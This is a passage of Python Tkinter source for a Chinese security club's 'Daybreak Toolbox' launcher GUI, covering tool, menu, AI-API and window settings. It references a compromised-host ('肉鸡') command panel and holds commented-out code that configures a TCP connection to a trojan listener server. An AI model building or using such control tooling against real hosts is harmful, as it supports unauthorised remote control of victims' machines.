import re
import time
import chardet
import socket
import threading
import queue
import platform
import getpass
import select
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from tkinter import *
from tkinter import colorchooser, scrolledtext, ttk
from tkinter.ttk import Combobox

try:
    from fanyi import *
except Exception:
    # 翻译依赖缺失（如 requests 未安装）时不阻止主程序启动，使用翻译功能时再提示
    translate_text = None

try:
    from Chat_AI import *
except Exception:
    from fun import *

# 一、定义主窗口
root = Tk()
root.title(f"破晓·工具箱（Daybreak Toolbox） {next(iter(get_update_record_content().keys()))} - Daybreak网络安全协会")
img = PhotoImage(file='images/daybreak_logo.png')  # 替换为你的图标文件路径
root.iconphoto(True, img)  # True 表示设置为应用程序图标，适用于所有窗口
root.config(bg="white")  # 背景设置
windowSize_json = get_windowSize_json()
if check_json_null(windowSize_json):
    center_window(root, windowSize_json['windowSize_Width'], windowSize_json['windowSize_Higths'])  # 窗体的位置和长宽
else:
    center_window(root, 1000, 500)  # 窗体的位置和长宽
# 确保窗口已经初始化
root.update()

### 二、定义画布
# 定义画布的大小和边距
canvas_width = int(root.winfo_width() * 0.9)
canvas_height = int(root.winfo_height() * 0.9)
# 创建画布，并使用 grid 布局管理器
canvas = Canvas(root, width=canvas_width, height=canvas_height, bg="gray")
# 需要指定 row, column, padx, pady, sticky
canvas.grid(row=0, column=0, padx=int(root.winfo_width() * 0.02), pady=int(root.winfo_height() * 0.08), sticky="nsew")
# 配置主窗口，使画布居中
root.columnconfigure(0, weight=1)  # 设置列的权重
root.rowconfigure(0, weight=1)    # 设置行的权重

### 三、画布上定义文本
# 画布上定义文本
text_id = canvas.create_text(canvas_width / 2, canvas_height * 0.05, text="破晓·工具箱首页", font=("Helvetica", 20), fill="lightgray", tags="my_text")

### 四、定义按钮的frame
# 画布上定义frame，这里应该是按钮的frame
frame = Frame(canvas, bg="grey", relief="solid", highlightbackground="red", highlightthickness=2)  # 创建 Frame
frame_id = None     # 这里存放上面 画布中定义的 frame 的ID信息

### 五、菜单栏上定义临时笔记
note_frame = None

### 六、菜单栏上定义kimi_AI
AI_ask_frame = None

### 七、菜单栏上定义本地终端
local_cmd_frame = None

### 八、菜单栏上定义百度翻译
baidu_fanyi_frame = None

### 九、菜单栏上的肉鸡信息
rouji_command_panel = None

### 十、编解码工具
encode_decode_frame = None

# 给全局的text文本框组件增加 ctrl + a 的去除结尾及换行函数
# 全局Ctrl+A处理函数，只选中实际文本内容
def global_ctrl_a_handler(event):
    """
    全局Ctrl+A处理函数 - 增强版
    1. 只选中实际文本内容
    2. 光标移动到文本开头
    3. 深灰色选中背景
    4. 确保文本开头可见
    5. 添加视觉反馈
    """
    widget = event.widget

    # 检查是否是Text组件
    if isinstance(widget, Text):
        # 保存当前的插入点位置
        current_insert = widget.index("insert")

        # 获取实际文本内容
        content = widget.get("1.0", "end-1c")

        if content.strip():  # 有实际内容
            # 先滚动到顶部，确保能看到选中效果
            widget.see("1.0")

            # 轻微延迟后执行选中，给用户视觉反馈
            def delayed_select():
                # 清除现有选中
                widget.tag_remove("sel", "1.0", "end")

                widget.tag_configure("sel",
                                     background="#a8d1ff",  # 浅蓝色（与临时笔记主题一致）
                                     foreground="#000000",  # 纯黑色文字
                                     borderwidth=1,
                                     relief="flat")

                # 选中实际文本内容
                widget.tag_add("sel", "1.0", "end-1c")

                # 将光标移动到文本开头
                widget.mark_set("insert", "1.0")

                # 再次确保开头可见
                widget.see("1.0")

                # 给一个视觉反馈（可选）
                widget.config(insertbackground="red")  # 光标变红色
                widget.after(100, lambda: widget.config(insertbackground="black"))

            # 执行延迟选中
            widget.after(10, delayed_select)

        else:  # 文本为空
            # 将光标移动到文本开头
            widget.mark_set("insert", "1.0")
            widget.see("1.0")

        return "break"  # 阻止默认行为

    return None

# 绑定事件
root.bind_class("Text", "<Control-a>", global_ctrl_a_handler)
root.bind_class("Text", "<Control-A>", global_ctrl_a_handler)

# 给Entry 控件添加提示信息
def entry_Event(tool_Name,event_msg):

    # 初始显示提示文本
    tool_Name.insert(0, event_msg)
    tool_Name.configure(fg="grey")  # 文本颜色恢复为灰色

    def on_focus_out(event):
        # 当 Entry 失去焦点时，如果内容为空，则显示提示文本
        if not tool_Name.get():
            tool_Name.delete(0, END)
            tool_Name.insert(0, event_msg)
            tool_Name.configure(fg="grey")  # 文本颜色恢复为灰色

    def on_focus_in(event):
        # 当 Entry 获得焦点时，如果显示的是提示文本，则清空
        current_text = tool_Name.get()
        if current_text == event_msg:
            tool_Name.delete(0, END)
            tool_Name.configure(fg="black")  # 文本颜色恢复为灰色

    # 绑定事件
    tool_Name.bind('<FocusOut>', on_focus_out)
    tool_Name.bind('<FocusIn>', on_focus_in)

# 增加画布上的按钮
def add_Tools():
    # 一、获取全局变量

    # 二、初始化子窗口
    top = Toplevel(root)    # root的子窗口
    top.title("添加工具信息")
    # top.iconbitmap("favicon.ico")
    top.config(bg="white")  # 背景设置
    top.resizable(False, False) # 禁止改变窗体大小
    center_window(top, 400, 300)    # 窗体的位置和长宽
    top.grab_set()       # 设置子窗口为模态，阻止对主窗口的操作

    # 三、制作添加工具的子窗口
    # 1、工具名称
    label = Label(top, text="工具名称:")
    label.grid(row=0, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    tool_name = Entry(top)
    tool_name.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
    entry_Event(tool_name,"请写入工具的名称")  # 给entry 控件添加一个提示信息

    # 2、工具路径
    color_label = Label(top, text="工具路径:")
    color_label.grid(row=1, column=0, padx=(0, 10), sticky='e')
    tool_path = Entry(top)
    tool_path.grid(row=1, column=1, padx=(0, 10), sticky='we')
    entry_Event(tool_path,"绝对/相对路径(a\\1.exe)/文件夹路径(a)/URL地址/工具地址")  # 给entry 控件添加一个提示信息

    # 3、工具分类
    command_label = Label(top, text="工具分类:")
    command_label.grid(row=2, column=0, padx=(0, 10), sticky='e')

    # 创建下拉框（Combobox），并设置为只读
    tool_menu = Combobox(top, values=get_menu_name_all(), state="readonly")
    tool_menu.grid(row=2, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中

    # 4、工具作用分类
    use_label = Label(top, text="工具作用:")
    use_label.grid(row=3, column=0, padx=(0, 10), sticky='e')

    # 定义 工具分类 的选项
    def on_tool_category_change(*args):
        # 根据选中的分类（菜单栏）更新 tool_uses
        tool_navigation_bar['values'] = get_navigation_bar_one(tool_menu.get())  # 设置下拉框的选项

    tool_menu.bind("<<ComboboxSelected>>", on_tool_category_change)

    # 创建下拉框（Combobox），并设置为只读
    tool_navigation_bar = Combobox(top, values=get_navigation_bar_one(tool_menu.get()), state="readonly")
    tool_navigation_bar.grid(row=3, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中

    # 5、启动方式
    run_type_label = Label(top, text="启动方式:")
    run_type_label.grid(row=4, column=0, padx=(0, 10), sticky='e')

    # 创建下拉框（Combobox），并设置为只读
    tool_run_type = Combobox(top, values=["直接打开","命令行打开","文件夹打开","链接打开","下载链接"], state="readonly")
    tool_run_type.current(0)  # 设置当前选中项为第一个
    tool_run_type.grid(row=4, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中

    def run_command(*args):
        if tool_run_type.get() == "命令行打开":
            command = simpledialog.askstring("设置启动命令", "工具名称位置请用 * 号来代替:")
            if command is not None and "*" in command:
                run_command_label.config(text=command)
        elif tool_run_type.get() == "文件夹打开":
            messagebox.showinfo("设置提醒！","请确保文件路径是一个文件夹！")
        elif tool_run_type.get() == "下载链接" or tool_run_type.get() == "链接打开":
            messagebox.showinfo("设置提醒！","请确保文件路径是一个带有http的链接！")
        else:
            run_command_label.config(text="")

    tool_run_type.bind("<<ComboboxSelected>>", run_command)
    # 6、工具命令
    ''''''
    command_label = Label(top, text="启动命令:")
    command_label.grid(row=5, column=0, padx=(0, 10), sticky='e')
    run_command_label = Label(top, text="")
    run_command_label.grid(row=5, column=1, padx=(0, 10), sticky='we')

    def save_button():
        # 做保存前的校验，工具名称是一个 tools.txt 文件中唯一的标识符
        def tool_name_check(tool_names,tool_path):
            # 1、校验文件名是否重复
            for tool in get_json_txt_all(tool_path):
                if tool["工具名称"] == tool_names:
                    # 进行工具名称重复警告
                    messagebox.showinfo("保存失败！", f"数据保存失败！\n重复的工具名称：{tool_names}")
                    return False
            # 2、校验启动方式是否照应
            if tool_runs == "命令行打开" and len(tool_commands) == 0:
                messagebox.showinfo("保存失败！", f"数据保存失败！\n请确保启动命令有效：{tool_commands}")
                return False
            elif tool_runs == "下载链接" and "http" not in tool_paths:
                # 如果是下载链接则创建对应的文件夹
                create_dir(get_menu_path_one(tool_menus) + "\\" + tool_names)

                messagebox.showinfo("保存失败！", f"数据保存失败！\n工具路径需要是链接：{tool_paths}")
                return False
            return True

        tool_names = tool_name.get()
        tool_paths = tool_path.get()
        tool_menus = tool_menu.get()
        tool_navigation_bars = tool_navigation_bar.get()
        tool_runs = tool_run_type.get()
        tool_commands = run_command_label.cget("text")

        # 构建工具信息的字典
        tool_info = {
            "工具名称": tool_names,
            "工具路径": tool_paths,
            "工具分类": tool_menus,
            "工具使用": tool_navigation_bars,
            "启动方式": tool_runs,
            "工具命令": tool_commands,
            "index" :   0
        }
        txt_path = get_menu_path_one(tool_menus)    # 拿到对应的文件夹名称

        # 保存前进行校验
        if tool_name_check(tool_names,txt_path):
            # 将工具信息保存到对应的 txt 文件
            save_tool_txt(txt_path,tool_info)

            messagebox.showinfo("保存成功", f"数据已成功保存！\n保存工具信息：{tool_names}, {tool_paths}, {tool_menus}, {tool_commands}")
            top.destroy()  # 关闭窗口

    # 四、设置保存按钮，以保存信息
    save_button = Button(top, text="保存", command=save_button)
    save_button.grid(row=6, columnspan=2, pady=10)

    # 五、确保行和列被正确地拉伸以适应内容
    top.grid_columnconfigure(1, weight=1)
    top.grid_rowconfigure(0, weight=1)
    top.grid_rowconfigure(1, weight=1)
    top.grid_rowconfigure(2, weight=1)
    top.grid_rowconfigure(3, weight=1)
    top.grid_rowconfigure(4, weight=1)
    top.grid_rowconfigure(5, weight=1)
    top.grid_rowconfigure(6, weight=1)

# 增加导航栏
def add_navigation_bar():
    # 一、获取全局变量

    # 二、初始化子窗口
    add_Navigation_Bar = Toplevel(root)    # root的子窗口
    add_Navigation_Bar.title("添加导航栏信息")
    # top.iconbitmap("favicon.ico")
    add_Navigation_Bar.config(bg="white")  # 背景设置
    add_Navigation_Bar.resizable(False, False) # 禁止改变窗体大小
    center_window(add_Navigation_Bar, 400, 200)    # 窗体的位置和长宽
    add_Navigation_Bar.grab_set()     # 设置子窗口为模态，阻止对主窗口的操作

    # 三、制作添加菜单栏的子窗口
    # 1、选择要添加到的菜单栏
    menu_label = Label(add_Navigation_Bar, text="选择菜单栏:")
    menu_label.grid(row=0, column=0, padx=(0, 10), sticky='e')

    # 创建下拉框（Combobox），并设置为只读
    menu_names = get_menu_name_all()
    add_Navigation_Bar_menu = Combobox(add_Navigation_Bar, values=menu_names, state="readonly")
    add_Navigation_Bar_menu.set(menu_names[0])  # 默认选中第一项
    add_Navigation_Bar_menu.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中

    # 2、导航栏名称
    label = Label(add_Navigation_Bar, text="导航栏名称:")
    label.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    add_Navigation_Bar_name = Entry(add_Navigation_Bar)
    add_Navigation_Bar_name.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
    entry_Event(add_Navigation_Bar_name,"请写入要添加的导航栏的名称")  # 给entry 控件添加一个提示信息

    # 四、设置保存按钮，以保存信息
    def save_Navigation_Bar():
        # 做导航栏名称重复冲突的校验
        def Navigation_Bar_name_check(menu_names,navigation_bar_names):
            for navigation_bar_name in get_navigation_bar_one(menu_names):
                if navigation_bar_name == navigation_bar_names:
                    return False
            return True

        add_Navigation_Bar_menus = add_Navigation_Bar_menu.get()
        add_Navigation_Bar_names = add_Navigation_Bar_name.get()
        # 校验
        if Navigation_Bar_name_check(add_Navigation_Bar_menus,add_Navigation_Bar_names):
            # 构造完整的json 格式
            navigation_bar_name = get_navigation_bar_one(add_Navigation_Bar_menus)
            if len(navigation_bar_name) == 0:
                config_json[add_Navigation_Bar_menus]["navigation_bar_name"] = [add_Navigation_Bar_names]
            else:
                navigation_bar_name.append(add_Navigation_Bar_names)

            # 传入完整的json 格式进行写入，保存导航栏
            save_json_all(config_json)

            messagebox.showinfo("添加成功", f"数据已成功保存！\n添加的导航栏名称：{add_Navigation_Bar_names}\n可以继续添加！！！")

            # 对添加的菜单栏做刷新操作
            reload_canvas(add_Navigation_Bar_menus)

            add_Navigation_Bar.destroy()  # 关闭窗口
        else:
            # 进行菜单栏名称重复警告
            messagebox.showinfo("添加失败！", f"数据保存失败！\n重复的菜单栏名称：{add_Navigation_Bar_names}")

    save_button = Button(add_Navigation_Bar, text="添加", command=save_Navigation_Bar)
    save_button.grid(row=2, columnspan=2, pady=10)

    # 五、确保行和列被正确地拉伸以适应内容
    add_Navigation_Bar.grid_columnconfigure(1, weight=1)
    add_Navigation_Bar.grid_rowconfigure(0, weight=1)
    add_Navigation_Bar.grid_rowconfigure(1, weight=1)
    add_Navigation_Bar.grid_rowconfigure(2, weight=1)

# 添加菜单栏
def add_menus():
    # 一、获取全局变量

    # 二、初始化子窗口
    add_Menu = Toplevel(root)    # root的子窗口
    add_Menu.title("添加菜单栏信息")
    # top.iconbitmap("favicon.ico")
    add_Menu.config(bg="white")  # 背景设置
    add_Menu.resizable(False, False) # 禁止改变窗体大小
    center_window(add_Menu, 400, 200)    # 窗体的位置和长宽
    add_Menu.grab_set()     # 设置子窗口为模态，阻止对主窗口的操作

    # 三、制作添加菜单栏的子窗口
    # 1、菜单栏名称
    label = Label(add_Menu, text="菜单栏名称:")
    label.grid(row=0, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    menu_name = Entry(add_Menu)
    menu_name.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
    entry_Event(menu_name,"请写入要添加的菜单栏的名称")  # 给entry 控件添加一个提示信息

    # 2、菜单栏对应的文件夹路径
    label_path = Label(add_Menu, text="对应文件夹:")
    label_path.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    menu_path = Entry(add_Menu)
    menu_path.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
    entry_Event(menu_path,"创建英文文件夹名称方便工具分类")  # 给entry 控件添加一个提示信息

    # 3、菜单栏下对应的颜色
    def choose_color():
        color_code = colorchooser.askcolor(title="选择颜色")
        if color_code[1] is not None:
            color_label.config(text=color_code[1])  # 更新颜色显示
            color_label.config(bg=color_code[1])  # 更新颜色显示

    # 调整按钮和标签的网格位置
    menu_color = Button(add_Menu, text="颜色风格", command=choose_color)
    menu_color.grid(row=2, column=0, padx=(0, 10), pady=(10, 0))  # 按钮放在第2行第0列

    color_label = Label(add_Menu, text="这里显示选择的颜色")
    color_label.grid(row=2, column=1, padx=(0, 10), pady=(10, 0), sticky='we')  # 标签放在第2行第1列

    # 四、设置保存按钮，以保存信息
    def save_button():
        # 做菜单栏名称和路径重复冲突的校验 以及其他的检验
        def menu_name_path_check(menu_names,menu_paths, menu_colors):
            if config_json_null_check():
                for menu_name in get_menu_name_all():
                    if menu_names == menu_name or menu_paths == get_menu_path_one(menu_name):
                        return False
            if menu_names == None or menu_paths == None or menu_colors == None or menu_colors == "这里显示选择的颜色":
                return False
            return True

        menu_names = menu_name.get()
        menu_paths = menu_path.get()
        menu_colors = color_label.cget("text")
        # 校验
        if menu_name_path_check(menu_names, menu_paths, menu_colors):
            # 构造json格式进行保存
            menu_info = {
                menu_names:{
                    "menu_path"  :   menu_paths,
                    "menu_color"    :   menu_colors,
                    "navigation_bar_name"   :   [
                        "首页"
                    ]
                }
            }

            # 合并两个JSON数据，构造完整的json 格式
            json_info = {**config_json, **menu_info}

            # 传入完整的json 格式进行写入，保存菜单栏名称
            save_json_all(json_info)

            # 创建对应的文件夹路径
            create_dir(menu_paths)

            messagebox.showinfo("添加成功", f"菜单栏添加成功！请手动重启工具箱展示\n添加的菜单栏名称：{menu_names}\n请在之后将对应的工具保存到{menu_paths}目录中")
            add_Menu.destroy()  # 关闭窗口

            root.destroy()  # 'root' 是主窗口的实例
        else:
            # 进行菜单栏名称重复警告
            messagebox.showinfo("添加失败！", f"数据保存失败！\n重复的菜单栏名称：{menu_names}或必要属性未设置！")

    save_button = Button(add_Menu, text="添加", command=save_button)
    save_button.grid(row=3, columnspan=2, pady=10)

    # 五、确保行和列被正确地拉伸以适应内容
    add_Menu.grid_columnconfigure(1, weight=1)
    add_Menu.grid_rowconfigure(0, weight=1)
    add_Menu.grid_rowconfigure(1, weight=1)
    add_Menu.grid_rowconfigure(2, weight=1)
    add_Menu.grid_rowconfigure(3, weight=1)

# 清除画布内容，做刷新操作，加载界面、导航栏、按钮等
def reload_canvas(menu_name):    # 更新画布
    global frame, config_ai_json , frame_id

    # 如果之前按钮的frame 还存在，则销毁
    if frame is not None:
        frame.destroy() # 如果存在之前的框架，则进行销毁

    # 3、如果当前菜单是 "note_menu"，则显示 临时笔记
    if menu_name == "note_nemu":
        # 1、遍历 root 内的所有place子组件进行隐藏
        for widget in root.winfo_children():
            # 隐藏导航栏组件
            if widget.winfo_manager() == "place":
                widget.place_forget()
        # 2、隐藏 ai对话模型
        AI_ask_frame.grid_forget()

        # 3、隐藏本地终端
        # local_cmd_frame.grid_forget()

        # 4、隐藏编解码面板
        encode_decode_frame.grid_forget()

        # 5、隐藏百度翻译
        baidu_fanyi_frame.grid_forget()

        # 6、隐藏肉鸡面板
        rouji_command_panel.grid_forget()

        # 8、显示笔记
        note_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    elif menu_name == "ai_ask":
        # 1、遍历 root 内的所有place子组件进行隐藏
        for widget in root.winfo_children():
            # 隐藏导航栏组件
            if widget.winfo_manager() == "place":
                widget.place_forget()
        # 2、隐藏 临时笔记
        note_frame.grid_forget()

        # 3、隐藏本地终端
        # local_cmd_frame.grid_forget()

        # 4、隐藏编解码面板
        encode_decode_frame.grid_forget()

        # 5、隐藏百度翻译
        baidu_fanyi_frame.grid_forget()

        # 6、隐藏肉鸡面板
        rouji_command_panel.grid_forget()

        # 8、判断api是否配置好
        if config_ai_json_null_check(): # 配置好了进行ai展示
            # 显示ai对话模型
            AI_ask_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        else:   # 没配置好，不能展示
            messagebox.showinfo("警告！","请先在工具箱配置中配置好AI的API！")
    # elif menu_name == "local_cmd":
    #     # 1、遍历 root 内的所有place子组件进行隐藏
    #     for widget in root.winfo_children():
    #         # 隐藏导航栏组件
    #         if widget.winfo_manager() == "place":
    #             widget.place_forget()
    #     # 2、隐藏 临时笔记
    #     note_frame.grid_forget()
    #
    #     # 3、隐藏ai对话
    #     AI_ask_frame.grid_forget()
    #
    #     # 4、隐藏百度翻译
    #     baidu_fanyi_frame.grid_forget()
    #
    #     # 5、隐藏肉鸡面板
    #     rouji_command_panel.grid_forget()
    #
    #     # 6、显示本地终端
    #     local_cmd_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    elif menu_name == "baidu_fanyi":
        # 1、遍历 root 内的所有place子组件进行隐藏
        for widget in root.winfo_children():
            # 隐藏导航栏组件
            if widget.winfo_manager() == "place":
                widget.place_forget()
        # 2、隐藏 临时笔记
        note_frame.grid_forget()

        # 3、隐藏ai对话
        AI_ask_frame.grid_forget()

        # 4、隐藏本地终端
        # local_cmd_frame.grid_forget()

        # 5、隐藏编解码面板
        encode_decode_frame.grid_forget()

        # 6、隐藏肉鸡面板
        rouji_command_panel.grid_forget()

        # 8、展示百度翻译
        baidu_fanyi_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    elif menu_name == "encode_decode":
        # 隐藏其他组件
        for widget in root.winfo_children():
            if widget.winfo_manager() == "place":
                widget.place_forget()
        # 2、隐藏 临时笔记
        note_frame.grid_forget()

        # 3、隐藏ai对话
        AI_ask_frame.grid_forget()

        # 4、隐藏百度翻译
        baidu_fanyi_frame.grid_forget()

        # 5、隐藏肉鸡面板
        rouji_command_panel.grid_forget()

        # 7、显示编解码面板
        encode_decode_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    elif menu_name == "rouji_panel":
        # 1、遍历 root 内的所有place子组件进行隐藏
        for widget in root.winfo_children():
            # 隐藏导航栏组件
            if widget.winfo_manager() == "place":
                widget.place_forget()
        # 2、隐藏 临时笔记
        note_frame.grid_forget()

        # 3、隐藏ai对话
        AI_ask_frame.grid_forget()

        # 4、隐藏本地终端
        # local_cmd_frame.grid_forget()

        # 4、隐藏编解码面板
        encode_decode_frame.grid_forget()

        # 5、隐藏百度翻译
        baidu_fanyi_frame.grid_forget()

        # 7、显示肉鸡面板
        rouji_command_panel.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
    else:
        ## 隐藏 其他的菜单栏
        note_frame.grid_forget()  # 隐藏note临时笔记操作
        AI_ask_frame.grid_forget()  # 隐藏ai_ask对话模型
        # local_cmd_frame.grid_forget()   # 隐藏本地终端
        encode_decode_frame.grid_forget()  # 隐藏编解码
        baidu_fanyi_frame.grid_forget() # 隐藏百度翻译
        rouji_command_panel.grid_forget()   # 隐藏肉鸡面板

        # 1、更新画布的文本为 菜单栏名称
        canvas.itemconfigure(text_id, text=menu_name, fill=get_menu_color_one(menu_name))

        # 2、更新画布的Frame。这里的Frame 是按钮的，导航栏的Frame是临时创建的
        new_frame = Frame(canvas, bg="grey", relief="solid", highlightbackground=get_menu_color_one(menu_name), highlightthickness=2)
        # 将 Frame 放置在 Canvas 上，居中并有一点垂直偏移
        frame_id = canvas.create_window(canvas_width / 2 + 5, canvas_height * 0.1 + 5, window=new_frame, anchor='n')

        # 3、进行不同的导航栏创建和首页显示
        create_Navigation_Bar(root,new_frame,get_navigation_bar_one(menu_name),menu_name)   # 创建导航栏
        load_tools_and_create_buttons(new_frame,menu_name)     # 展示首页

        # 4、更新 get_canvas 列表中的当前 Frame
        frame = new_frame

        # 绑定窗口拉伸
        root.bind("<Configure>", lambda event, text_id=text_id, frame_id=frame_id: update_position(event, text_id, frame_id))

# 设置AI_ask 配置
def add_ai_setting():
    # 一、获取全局变量

    # 二、初始化子窗口
    ai_ask_config = Toplevel(root)    # root的子窗口
    ai_ask_config.title("设置AI对话模型信息")
    # top.iconbitmap("favicon.ico")
    ai_ask_config.config(bg="white")  # 背景设置
    ai_ask_config.resizable(False, False) # 禁止改变窗体大小
    center_window(ai_ask_config, 400, 200)    # 窗体的位置和长宽
    ai_ask_config.grab_set()     # 设置子窗口为模态，阻止对主窗口的操作

    # 三、修改AI对话模型的配置
    # 1、选择AI模型
    ai_label = Label(ai_ask_config, text="使用模型:")
    ai_label.grid(row=0, column=0, padx=(0, 10), sticky='e')

    # 创建下拉框（Combobox），并设置为只读
    ai_names_all = get_ai_json_name_all()
    ai_name = Combobox(ai_ask_config, values=ai_names_all, state="readonly")
    ai_name.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中

    # 2、AI模型对应的API
    ai_API_label = Label(ai_ask_config, text="API配置:")
    ai_API_label.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    ai_API = Entry(ai_ask_config)
    ai_API.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后

    # 定义 ai模型下拉框 的选项变化
    def on_change(*args):
        default_value = get_ai_json_one_api(ai_name.get())
        # 清空ai_API 控件内容之后在显示default_value
        ai_API.delete(0, END)
        # 判断是不是空字符串
        if default_value != "" and default_value != None:
            entry_Event(ai_API, default_value)
        else:
            if ai_name.get() == "ollama":
                entry_Event(ai_API, "请输入ollama模型地址(http://xxx:xxx/)")
            else:
                entry_Event(ai_API,"请输入ai模型的API")  # 给entry 控件添加一个提示信息

    ai_name.bind("<<ComboboxSelected>>", on_change)

    # 3、设置分页数量
    page_label = Label(ai_ask_config, text="分栏数量:")
    page_label.grid(row=2, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    page_num = Combobox(ai_ask_config, values=['1','2'], state="readonly")
    page_num.grid(row=2, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中
    page_num.current(0)  # 设置默认值为 '1'

    # # 定义 分页数量下拉框 的选项变化
    def on_change(*args):
        ai_name_one = ai_name.get()
        if int(page_num.get()) == 2 and ai_name_one in ai_names_all:
            ai_names_all.remove(ai_name_one)
            ai_name_two.config(values=ai_names_all)
        else:
            # messagebox.showinfo("错误","请先选择第一个ai模型")
            pass

    page_num.bind("<<ComboboxSelected>>", on_change)

    # 4、设置分栏的第二个ai
    ai_label_two = Label(ai_ask_config, text="分栏模型:")
    ai_label_two.grid(row=3, column=0, padx=(0, 10), sticky='e')
    ai_name_two = Combobox(ai_ask_config, values=[], state="readonly")
    ai_name_two.grid(row=3, column=1, padx=(0, 10), sticky='we')  # 将下拉框放置在网格中

    # 四、设置保存按钮，以保存信息
    def save_button():
        # 做菜单栏名称和路径重复冲突的校验 以及其他的检验
        def menu_name_path_check(ai_names, page_nums, ai_names_two):
            all_ai_names = get_ai_json_name_all()
            if page_nums == 2 and ai_names_two != ai_names:
                return True
            elif page_nums == 1 and ai_names in all_ai_names:
                return True
            return False

        ai_names = ai_name.get()
        ai_APIs = ai_API.get()
        page_nums = int(page_num.get())
        ai_names_two = ai_name_two.get()
        # 校验
        if menu_name_path_check(ai_names, page_nums, ai_names_two):
            # 修改ai的json文件
            update_ai_json(ai_names, ai_APIs, page_nums, ai_names_two)

            messagebox.showinfo("修改成功", f"API设置成功，重启后生效！")
            ai_ask_config.destroy()  # 关闭窗口

            root.destroy()  # 'root' 是主窗口的实例
        else:
            # 进行菜单栏名称重复警告
            messagebox.showinfo("修改失败！", f"配置文件中不存在 {ai_names} 的ai名称")

    save_button = Button(ai_ask_config, text="设置", command=save_button)
    save_button.grid(row=4, columnspan=2, pady=10)

    # 五、确保行和列被正确地拉伸以适应内容
    ai_ask_config.grid_columnconfigure(1, weight=1)
    ai_ask_config.grid_rowconfigure(0, weight=1)
    ai_ask_config.grid_rowconfigure(1, weight=1)
    ai_ask_config.grid_rowconfigure(2, weight=1)
    ai_ask_config.grid_rowconfigure(3, weight=1)
    ai_ask_config.grid_rowconfigure(4, weight=1)

# 设置木马监听
# def muma_listen_setting():
#     global client
#
#     messagebox.showinfo("前提条件","是否已经将将当前目录下的 server.py 文件放置于服务器，并开启监听。如果没有请开启监听之后在执行后面的操作")
#
#     # 一、获取全局变量
#
#     # 二、初始化子窗口
#     top = Toplevel(root)    # root的子窗口
#     top.title("设置服务端监听信息")
#     # top.iconbitmap("favicon.ico")
#     top.config(bg="white")  # 背景设置
#     top.resizable(False, False) # 禁止改变窗体大小
#     center_window(top, 400, 300)    # 窗体的位置和长宽
#     top.grab_set()       # 设置子窗口为模态，阻止对主窗口的操作
#
#     # 三、制作添加木马监听的子窗口
#     # 1、服务端IP信息
#     label = Label(top, text="服务端IP：")
#     label.grid(row=0, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
#     listen_ip = Entry(top)
#     listen_ip.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
#
#     # 2、服务端端口信息
#     label = Label(top, text="服务端端口：")
#     label.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
#     listen_port = Entry(top)
#     listen_port.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
#
#     def save_button():
#         global client
#
#         server_IP = listen_ip.get()
#         server_Port = int(listen_port.get())
#         try:
#             # 创建tcp连接
#             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP连接
#             # 连接服务端
#             client.connect((server_IP, server_Port-1))
#             messagebox.showinfo("成功！","服务器配置成功！")
#             # 保存到文件中
#
#             json_info = {
#                 "server_ip"     :   server_IP,
#                 "server_port"   :   server_Port
#             }
#
#             save_server_json(json_info) # 保存信息到本地
#         except:
#             messagebox.showinfo("错误！","请正确填写信息！")
#
#     # 四、设置保存按钮，以保存信息
#     save_button = Button(top, text="测试连接", command=save_button)
#     save_button.grid(row=2, columnspan=1, pady=10)
#
#     # 五、确保行和列被正确地拉伸以适应内容
#     top.grid_columnconfigure(1, weight=1)
#     top.grid_rowconfigure(0, weight=1)
#     top.grid_rowconfigure(1, weight=1)

# 设置启动窗口大小
def windowSize_Setting():
    # 一、获取全局变量

    # 二、初始化子窗口
    windowSize_config = Toplevel(root)    # root的子窗口
    windowSize_config.title("设置启动窗口大小")
    windowSize_config.config(bg="white")  # 背景设置
    windowSize_config.resizable(False, False) # 禁止改变窗体大小
    center_window(windowSize_config, 400, 200)    # 窗体的位置和长宽
    windowSize_config.grab_set()     # 设置子窗口为模态，阻止对主窗口的操作

    # 三、修改启动窗口大小的配置
    # 1、选择启动窗口大小的宽度
    windowSize_Width_label = Label(windowSize_config, text="启动窗口宽度:")
    windowSize_Width_label.grid(row=0, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    windowSize_Width = Entry(windowSize_config)
    windowSize_Width.grid(row=0, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
    entry_Event(windowSize_Width,f"{root.winfo_width()}")  # 给entry 控件添加一个提示信息

    # 2、启动窗口大小的高度
    windowSize_Higth_label = Label(windowSize_config, text="启动窗口高度:")
    windowSize_Higth_label.grid(row=1, column=0, padx=(0, 10), sticky='e')  # 对齐到列的东侧
    windowSize_Higth = Entry(windowSize_config)
    windowSize_Higth.grid(row=1, column=1, padx=(0, 10), sticky='we')  # 紧随label之后
